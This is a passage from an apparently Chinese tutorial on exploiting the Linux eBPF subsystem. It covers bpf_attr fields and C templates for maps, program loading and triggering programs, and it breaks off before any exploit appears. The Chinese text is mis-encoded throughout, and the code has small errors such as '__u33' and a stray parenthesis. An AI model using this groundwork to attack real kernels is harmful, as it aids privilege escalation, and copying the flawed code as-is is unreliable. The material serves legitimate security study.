<li>å‚æ•°<code>union bpf_attr *attr</code>æ ¹æ®<code>cmd</code>çš„ä¸åŒæœ‰ä¸åŒçš„æ ¼å¼ï¼Œè¯¥å‚æ•°ç±»å‹ä¸º<code>union bpf_attr *</code>ï¼Œä¸ºä¸€ä¸ªåŒ…å«å¤šç§ç»“æ„ä½“çš„è”åˆä½“æŒ‡é’ˆã€‚è¯¥ç±»å‹<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1462">å®Œæ•´åŸå‹</a>å¤ªé•¿äº†ï¼Œæˆ‘ä»¬åªçœ‹éƒ¨åˆ†ï¼šï¼ˆç¿»è¯‘å¹¶è¡¥å……äº†éƒ¨åˆ†æ³¨é‡Šï¼‰</li>
</ul>
<figure class="highlight c"><figcaption><span>bpf_attr</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1462">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/*ç”¨ä½œBPF_MAP_CREATEå‘½ä»¤çš„åŒ¿åç»“æ„ä½“ */</span></span><br><span class="line">  __u32 map_type; <span class="comment">/* æšä¸¾ bpf_map_type ä¸­çš„ä¸€ç§ */</span></span><br><span class="line">  __u32 key_size; <span class="comment">/* keyçš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ */</span></span><br><span class="line">  __u32 value_size; <span class="comment">/* valueçš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ */</span></span><br><span class="line">  __u32 max_entries; <span class="comment">/* ä¸€ä¸ªmapçš„æœ€å¤§å…¥å£æ•° */</span></span><br><span class="line">  __u32 map_flags; <span class="comment">/* BPF_MAP_CREATE ç›¸å…³</span></span><br><span class="line"><span class="comment">      * flags æ ‡å¿—åœ¨ä¸Šè¾¹å®šä¹‰</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">  __u32 inner_map_fd; <span class="comment">/* fd æŒ‡å‘å†…éƒ¨map */</span></span><br><span class="line">  __u32 numa_node; <span class="comment">/* numa èŠ‚ç‚¹ (ä»…åœ¨</span></span><br><span class="line"><span class="comment">      * BPF_F_NUMA_NODE è®¾ç½®æ—¶æœ‰æ•ˆ).</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">        ...</span><br><span class="line"> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* ç”¨ä½œBPF_MAP_*_ELEMå‘½ä»¤çš„åŒ¿åç»“æ„ä½“*/</span></span><br><span class="line">  __u32  map_fd; <span class="comment">// ä¼ å…¥BPF_MAP_CREATEå‘½ä»¤åˆ›å»ºçš„mapè¿”å›çš„fd</span></span><br><span class="line">  __aligned_u64 key;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">   __aligned_u64 value;</span><br><span class="line">   __aligned_u64 next_key;</span><br><span class="line">  &#125;;</span><br><span class="line">  __u64  flags; <span class="comment">// flagå€¼è§„å®šäº†å¯¹åº”å‘½ä»¤çš„è¡Œä¸º</span></span><br><span class="line"> &#125;;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* ç”¨ä½œBPF_PROG_LOADå‘½ä»¤çš„åŒ¿åç»“æ„ä½“ */</span></span><br><span class="line">  __u32  prog_type; <span class="comment">/* æšä¸¾ bpf_prog_type ä¸­çš„ä¸€ç§ */</span></span><br><span class="line">  __u32  insn_cnt; <span class="comment">// æŒ‡ä»¤é•¿åº¦</span></span><br><span class="line">  __aligned_u64 insns; <span class="comment">// ä¼ å…¥æŒ‡ä»¤çš„æŒ‡é’ˆï¼Œäº‹å®ä¸Šç±»å‹åº”è¯¥ä¸ºstruct bpf_insn **</span></span><br><span class="line">  __aligned_u64 license; <span class="comment">// ä¸€èˆ¬ä¸º&quot;GPL&quot;</span></span><br><span class="line">  __u32  log_level; <span class="comment">/* æ£€éªŒæŠ¥å‘Šçš„è¯¦ç»†ç¨‹åº¦ */</span></span><br><span class="line">  __u32  log_size; <span class="comment">/* ç”¨æˆ·ç¼“å†²åŒºçš„å¤§å° */</span></span><br><span class="line">  __aligned_u64 log_buf; <span class="comment">/* ç”¨æˆ·æä¾›çš„ç¼“å†²åŒº */</span></span><br><span class="line">  __u32  kern_version; <span class="comment">/* æ²¡ç”¨ */</span></span><br><span class="line">        ...</span><br><span class="line"> &#125;;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* ç”¨ä½œBPF_PROG_TEST_RUNå‘½ä»¤çš„åŒ¿åç»“æ„ä½“ */</span></span><br><span class="line">  __u32  prog_fd; <span class="comment">// ä¼ å…¥BPF_PROG_LOADå‘½ä»¤åˆ›å»ºçš„mapè¿”å›çš„fd</span></span><br><span class="line">  __u32  retval;</span><br><span class="line">  __u32  data_size_in; <span class="comment">/* è¾“å…¥: data_inçš„é•¿åº¦ */</span></span><br><span class="line">  __u32  data_size_out; <span class="comment">/* è¾“å…¥/è¾“å‡º: data_outçš„é•¿åº¦</span></span><br><span class="line"><span class="comment">       *   è¿”å› ENOSPC å¦‚æœ data_out</span></span><br><span class="line"><span class="comment">       *   å¤ªå°äº†.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">  __aligned_u64 data_in;</span><br><span class="line">  __aligned_u64 data_out;</span><br><span class="line">  __u32  repeat;</span><br><span class="line">  __u32  duration;</span><br><span class="line">  __u32  ctx_size_in; <span class="comment">/* è¾“å…¥: ctx_inçš„é•¿åº¦ */</span></span><br><span class="line">  __u33  ctx_size_out; <span class="comment">/* è¾“å…¥/è¾“å‡º: ctx_outçš„é•¿åº¦</span></span><br><span class="line"><span class="comment">       *   è¿”å› ENOSPC å¦‚æœ ctx_out</span></span><br><span class="line"><span class="comment">       *   å¤ªå°äº†.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">  __aligned_u64 ctx_in;</span><br><span class="line">  __aligned_u64 ctx_out;</span><br><span class="line">  __u32  flags;</span><br><span class="line">  __u32  cpu;</span><br><span class="line">  __u32  batch_size;</span><br><span class="line"> &#125; test;</span><br><span class="line">...</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ï¼Œ<code>map_type</code>çš„æšä¸¾ç±»å‹ä¸º<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L964"><code>enum bpf_map_type</code></a>ï¼Œéƒ¨åˆ†å†…å®¹ä¸ºï¼š</p>
<figure class="highlight c"><figcaption><span>bpf_map_type</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L964">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> &#123;</span></span><br><span class="line"> BPF_MAP_TYPE_UNSPEC, <span class="comment">// ä¿ç•™0ä½œä¸ºæ— æ•ˆç±»å‹</span></span><br><span class="line"> BPF_MAP_TYPE_HASH, <span class="comment">// å“ˆå¸Œè¡¨ï¼Œkey_sizeå’Œvalue_sizeä¸å—é™åˆ¶</span></span><br><span class="line"> BPF_MAP_TYPE_ARRAY, <span class="comment">// æ•°ç»„ï¼Œvalue_sizeä¸å—é™åˆ¶ï¼Œkey_sizeé™åˆ¶ä¸º4ï¼ˆuint32ï¼‰</span></span><br><span class="line"> BPF_MAP_TYPE_QUEUE, <span class="comment">// é˜Ÿåˆ—ï¼Œvalue_sizeä¸å—é™åˆ¶ï¼Œkey_sizeé™åˆ¶ä¸º0ï¼ˆæ²¡æœ‰é”®ï¼‰</span></span><br><span class="line"> BPF_MAP_TYPE_STACK, <span class="comment">// æ ˆï¼Œvalue_sizeä¸å—é™åˆ¶ï¼Œkey_sizeé™åˆ¶ä¸º0ï¼ˆæ²¡æœ‰é”®ï¼‰ï¼Œä½¿ç”¨ç‰¹æœ‰çš„Helperå‡½æ•°æ“ä½œ</span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>prog</code>çš„æšä¸¾ç±»å‹ä¸º<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1024"><code>enum bpf_prog_type</code></a>ï¼Œéƒ¨åˆ†å†…å®¹ä¸ºï¼š</p>
<figure class="highlight c"><figcaption><span>bpf_prog_type</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1024">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> &#123;</span></span><br><span class="line"> BPF_PROG_TYPE_UNSPEC, <span class="comment">// ä¿ç•™0ä½œä¸ºæ— æ•ˆç±»å‹</span></span><br><span class="line"> BPF_PROG_TYPE_SOCKET_FILTER, <span class="comment">// ç”¨äºè¿‡æ»¤/ä¿®æ”¹socketæ¥æ”¶çš„æ•°æ®åŒ…</span></span><br><span class="line"> BPF_PROG_TYPE_KPROBE, <span class="comment">// é™„åŠ åˆ°kprobeä¸Šçš„eBPF</span></span><br><span class="line"> BPF_PROG_TYPE_SCHED_CLS, <span class="comment">// å®ç°æµé‡æ§åˆ¶ï¼ˆTraffic Controlï¼‰çš„åˆ†ç±»ï¼ˆè¿‡æ»¤ï¼‰</span></span><br><span class="line"> BPF_PROG_TYPE_SCHED_ACT, <span class="comment">// å®ç°å¯¹æµé‡æ§åˆ¶ï¼ˆTraffic Controlï¼‰çš„æ“ä½œ</span></span><br><span class="line"> BPF_PROG_TYPE_TRACEPOINT, <span class="comment">// é™„åŠ åˆ°Linuxå†…æ ¸ç»ˆç«¯trace points,æ¥è·å¾—å†…æ ¸æ¶ˆæ¯</span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="è°ƒç”¨æ¨¡æ¿"><a href="#è°ƒç”¨æ¨¡æ¿" class="headerlink" title="è°ƒç”¨æ¨¡æ¿"></a>è°ƒç”¨æ¨¡æ¿</h2><p>ç”±æ­¤å¯è§ï¼Œå‚æ•°<code>union bpf_attr *attr</code>æ˜¯æœ€é‡è¦ä¸”ç¹ççš„å‚æ•°ã€‚åœ¨eBPF Pwnä¸­ï¼Œæˆ‘ä»¬å¾€å¾€åªéœ€è¦å…³æ³¨éƒ¨åˆ†å‚æ•°ï¼Œä¸‹è¾¹ç»™å‡ºä¸€äº›è°ƒç”¨æ¨¡æ¿ï¼š</p>
<blockquote>
<p>éœ€è¦çš„å¤´æ–‡ä»¶&#x2F;å®ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptr_to_u64(val) (uint64_t)val</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf(cmd, attr, size) syscall(__NR_bpf, cmd, attr, size)</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><figcaption><span>mapç›¸å…³</span><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/bpf.2.html">manual</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºmap, ä¸€èˆ¬ç±»å‹ä¸ºBPF_MAP_TYPE_ARRAYæˆ–BPF_MAP_TYPE_HASH</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> map_flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_type = map_type,</span><br><span class="line">      .key_size = key_size,</span><br><span class="line">      .value_size = value_size,</span><br><span class="line">      .max_entries = max_entries,</span><br><span class="line">      .map_flags = map_flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®keyæ¥æŸ¥æ‰¾valueï¼Œä¼ å…¥æŒ‡é’ˆ</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">        .value  = ptr_to_u64(value),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ–°/æ’å…¥key-valueå¯¹</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                <span class="type">uint64_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">        .value  = ptr_to_u64(value),</span><br><span class="line">        .flags  = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®keyæ¥åˆ é™¤value</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_delete_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®keyæ¥è·å–ä¸‹ä¸€ä¸ªkey</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_get_next_key</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *next_key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd   = fd,</span><br><span class="line">        .key      = ptr_to_u64(key),</span><br><span class="line">        .next_key = ptr_to_u64(next_key),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>bpf_create_map</code>ä¸­çš„å‚æ•°<code>max_entries</code>æŒ‡çš„æ˜¯mapçš„æœ€å¤§å®¹é‡ï¼ˆkey-valueå¯¹å¤§äºè¿™ä¸ªå€¼ä¸å…è®¸æ’å…¥ï¼‰<br><code>bpf_update_elem</code>çš„flagså‚æ•°ä¸º<code>BPF_NOEXIST</code>ï¼ˆkeyä¸å­˜åœ¨æ—¶æ‰ä¼šæ›´æ–°ï¼‰ï¼Œ<code>BPF_EXIST</code>ï¼ˆä»…åœ¨keyå­˜åœ¨æ—¶æ›´æ–°ï¼‰æˆ–<code>BPF_ANY</code>ï¼ˆä¸¤ç§æƒ…å†µå‡å¯ï¼‰</p>
</blockquote>
<figure class="highlight c"><figcaption><span>progåˆ›å»º</span><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/bpf.2.html">manual</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BUF_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span><br><span class="line"><span class="params">              <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insns, <span class="type">int</span> insn_cnt,</span></span><br><span class="line"><span class="params">              <span class="type">const</span> <span class="type">char</span> *license)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = type,</span><br><span class="line">        .insns     = ptr_to_u64(insns),</span><br><span class="line">        .insn_cnt  = insn_cnt,</span><br><span class="line">        .license   = ptr_to_u64(license),</span><br><span class="line">        .log_buf   = ptr_to_u64(bpf_log_buf),</span><br><span class="line">        .log_size  = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–è€…æ›´åŠ ç®€ä¾¿çš„</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_prog_load_once</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">/* add your code */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">        .insns = ptr_to_u64(&amp;insns),</span><br><span class="line">        .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">        .license = ptr_to_u64(<span class="string">&quot;GPL&quot;</span>),</span><br><span class="line">        .log_buf = ptr_to_u64(bpf_log_buf),</span><br><span class="line">        .log_size = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>eBPFè§¦å‘æ¨¡æ¿</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡socketè§¦å‘ï¼Œè¦æ±‚cmdä¸ºBPF_PROG_TYPE_SOCKET_FILTER</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger1</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span>* payload)</span> &#123;</span><br><span class="line">    socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets);</span><br><span class="line">    setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buffer = (<span class="type">char</span> *)payload;</span><br><span class="line">    <span class="keyword">return</span> write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡BPF_PROG_TEST_RUNè§¦å‘</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger2</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span>* payload)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[TST_DATA_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, TST_DATA_SIZE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer + <span class="number">0xe</span>, payload, TST_DATA_SIZE - <span class="number">0xe</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">skb</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">tst_run_attr</span> =</span> &#123;</span><br><span class="line">        .test.data_size_in = TST_DATA_SIZE,</span><br><span class="line">        .test.data_in = ptr_to_u64(&amp;buffer),</span><br><span class="line">        .test.ctx_size_in = <span class="keyword">sizeof</span>(skb),</span><br><span class="line">        .test.ctx_in = ptr_to_u64(&amp;skb),</span><br><span class="line">    &#125;;</span><br><span class="line">    tst_run_attr.test.prog_fd = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_TEST_RUN, &amp;tst_run_attr, <span class="keyword">sizeof</span>(tst_run_attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æœ‰å…³triggerå‡½æ•°åŸç†&#x2F;è¯¥é€‰ç”¨å“ªä¸€ä¸ªçš„é—®é¢˜ä¼šåœ¨åå‡ ç« è¯¦ç»†è§£é‡Š</p>
</blockquote>
<h2 id="eBPFæŒ‡ä»¤"><a href="#eBPFæŒ‡ä»¤" class="headerlink" title="eBPFæŒ‡ä»¤"></a>eBPFæŒ‡ä»¤</h2><p>åœ¨progåˆ›å»ºæ—¶éœ€è¦æä¾›æŒ‡ä»¤<code>struct bpf_insn *insns</code>ï¼Œä¹Ÿæ˜¯eBPFç¨‹åºçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚åœ¨eBPF Pwnä¸­ï¼ŒæŒ‡ä»¤çš„ç¼–å†™åœ¨è§¦å‘&#x2F;åˆ©ç”¨æ¼æ´ä¸­æ‰®æ¼”é‡è¦è§’è‰²ã€‚<br>åœ¨ç¼–å†™æŒ‡ä»¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ææ˜ç™½eBPFçš„å·¥ä½œæ¨¡å¼</p>
<blockquote>
